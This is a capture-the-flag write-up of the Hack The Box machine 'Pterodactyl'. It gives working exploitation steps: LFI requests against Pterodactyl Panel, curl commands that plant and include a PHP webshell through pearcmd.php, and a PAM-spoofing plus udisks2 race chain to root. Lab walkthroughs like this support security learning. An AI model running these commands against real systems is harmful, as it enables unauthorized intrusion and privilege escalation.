---
title: "Pterodactyl"
platform: "HTB"
difficulty: "Medium"
os: "Linux"
date: 2026-02-10
status: "rooted"
user_flag: true
root_flag: true
tags: [web, lfi, pearcmd, pam, polkit, udisks2, xfs, race-condition, suid, cve]
tools: [nmap, curl, python3, ssh, udisksctl, gdbus]
ttl: "6h"
---

Pterodactyl is an openSUSE Linux box running Pterodactyl Panel v1.11.10 with MariaDB. The attack chain involves unauthenticated LFI to extract database credentials, RCE via PHP PEAR command injection, lateral movement through cracked database credentials, and a multi-stage root escalation exploiting SUSE-specific PAM environment variable injection to gain polkit privileges, then a udisks2/XFS resize race condition to bypass nosuid and execute a SUID bash.

## Reconnaissance

### Port Scan

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH (openSUSE Leap)
80/tcp open  http    nginx 1.21.5
```

Two ports — SSH and HTTP. The web server hosts multiple virtual hosts.

### Virtual Host Discovery

| Vhost | Service |
|-------|---------|
| `pterodactyl.htb` | MonitorLand landing page with phpinfo.php and changelog.txt |
| `panel.pterodactyl.htb` | Pterodactyl Panel v1.11.10 (Laravel SPA) |
| `play.pterodactyl.htb` | Redirects to main site (302, not live) |

### Key Intel from phpinfo

- PHP 8.4.8 with FPM, running as `wwwrun:www`
- `disable_functions` = **EMPTY** (all PHP functions available)
- `open_basedir` = **EMPTY** (no directory restrictions)
- PHP-PEAR enabled (`include_path` contains `/usr/share/php/PEAR`)
- Changelog confirms MariaDB 11.8.3

## Initial Foothold — CVE-2025-49132 (LFI to RCE)

### Unauthenticated LFI

**CVE-2025-49132**: Pterodactyl Panel <= 1.11.10 has unauthenticated Local File Inclusion in `/locales/locale.json`. The `locale` and `namespace` parameters are passed directly to PHP `include()`.

### Config Extraction

```
GET /locales/locale.json?locale=../../../pterodactyl&namespace=config/database
GET /locales/locale.json?locale=../../../pterodactyl&namespace=config/app
```

Extracted credentials:
- **DB**: `pterodactyl:PteraPanel@127.0.0.1:3306/panel`
- **APP_KEY**: `base64:UaThTPQnUjrrK61o+Luk7P9o4hM+gl4UiMJqcbTSThY=`
- **HASHIDS_SALT**: `pKkOnx0IzJvaUXKWt2PK`

### RCE via pearcmd.php

With `disable_functions` empty and PEAR in the include path, we chain the LFI to include `pearcmd.php` with `config-create` to write a PHP webshell, then include it.

**Stage 1 — Write shell** (requires `curl -g` to preserve raw `<>` tags):
```bash
curl -s -g -H "Host: panel.pterodactyl.htb" \
  "http://10.129.244.62/locales/locale.json?\
+config-create+/&locale=../../../../../../usr/share/php/PEAR\
&namespace=pearcmd&/<?=system(hex2bin('HEX_CMD'))?>+/tmp/shell.php"
```

**Stage 2 — Include shell**:
```bash
curl -s -H "Host: panel.pterodactyl.htb" \
  "http://10.129.244.62/locales/locale.json?\
locale=../../../../../../tmp&namespace=shell"
```

HTTP 500 is expected on stage 2 (PEAR config isn't valid JSON). Output is doubled (system() echoes AND returns).

## User Flag

Running as `uid=474(wwwrun) gid=477(www)`. Enumerating home directories:

| User | Home Permissions |
|------|-----------------|
| `headmonitor` | `drwxr-x---` (admin, not readable) |
| `phileasfogg3` | `drwxr-xr-x` (world-readable) |

```
/home/phileasfogg3/user.txt → 4748b6c400e11163532e9cfb04282652
```

## Lateral Movement

### Database Access

MariaDB CLI rejects `pterodactyl:PteraPanel` but PHP PDO works via socket (`/run/mysql/mysql.sock`). Querying the users table:

| User | Email | Admin | Password Hash |
|------|-------|-------|---------------|
| headmonitor | headmonitor@pterodactyl.htb | YES | `$2y$10$3WJht3...` |
| phileasfogg3 | phileasfogg3@pterodactyl.htb | NO | `$2y$10$PwO0TB...` |

### SSH Access

Cracked `phileasfogg3`'s bcrypt hash: **`!QAZ2wsx`**

```bash
ssh phileasfogg3@pterodactyl.htb
```

`sudo -l` reveals `(ALL) ALL` but with `targetpw` — requires the **target** user's password, not your own. Direct sudo to root is a dead end without root's password.

## Root Escalation — CVE-2025-6018 + CVE-2025-6019

### CVE-2025-6018: SUSE PAM Environment Variable Injection

openSUSE Leap 15 ships with `pam_env` configured with `user_readenv=1` by default. Users can create `~/.pam_environment` to inject environment variables during SSH login.

```
XDG_SEAT OVERRIDE=seat0
XDG_VTNR OVERRIDE=1
```

This tricks `pam_systemd` into treating the SSH session as a **physical console session**. The session gains polkit `allow_active` privileges — normally only available to users sitting at the physical machine.

### CVE-2025-6019: udisks2/libblockdev XFS Resize Race Condition

With `allow_active` polkit privileges, the user can use `udisksctl loop-setup` to create loop devices. When `Filesystem.Resize` is called via D-Bus on an XFS filesystem, there's a race condition where the `nosuid` mount flag is **temporarily removed** during the resize operation.

### Exploit Chain

1. **PAM injection** — Create `~/.pam_environment` with seat0/vt1 spoofing
2. **Prepare XFS image** — 300MB XFS image containing a SUID-root openSUSE bash (`chmod 4755`)
3. **SSH login** — New session picks up spoofed environment, `loginctl` shows `Seat: seat0; vc1`
4. **Loop device** — `udisksctl loop-setup --file /tmp/xfs.image` creates `/dev/loop0`
5. **Race trigger** — `gdbus call ... Filesystem.Resize 0 '{}'` in a loop
6. **SUID window** — During resize, `nosuid` is briefly dropped on the mount
7. **Root shell** — `/tmp/blockdev*/bash -p` during the race window gives `euid=0(root)`

### Key Details

- XFS image must be created with privileged access (Docker works for building it)
- Must use the openSUSE bash binary for glibc compatibility
- `.pam_environment` format: `VARIABLE OVERRIDE=value` (space before OVERRIDE)
- Race condition won on first attempt with 10 resize triggers + background watcher

### Root Flag
```
2f6cda4acc571f508d33754fb7f44d76
```

## Lessons Learned

### What Worked
- Using phpinfo.php to confirm PEAR was in the include path — this was critical for the LFI-to-RCE chain
- PHP PDO via webshell when MySQL CLI authentication failed — different auth plugins handle socket vs TCP differently
- Recognizing `targetpw` as a dead end early and pivoting to look for PAM-based escalation paths

### What Failed
- Initially tried `pearcmd.php` at `/usr/share/php/pearcmd.php` — the actual path on openSUSE is `/usr/share/php/PEAR/pearcmd.php`
- Attempted `sudo -u root` multiple times before understanding `targetpw` semantics

### Key Takeaways
- **LFI + PEAR = RCE** — whenever you see PHP with PEAR in the include path and empty `disable_functions`, `pearcmd.php` config-create gives arbitrary file write
- **PHP PDO vs MySQL CLI** — socket-based auth can succeed where TCP auth fails; always try both
- **openSUSE PAM defaults are dangerous** — `user_readenv=1` means any user can spoof seat/vt environment variables to gain polkit `allow_active`
- **udisks2 resize race** — a real CVE class where mount flags are temporarily dropped during filesystem operations
- **SUID bash requires `-p`** — without `-p`, bash drops the effective UID; this is the most common oversight in SUID exploits
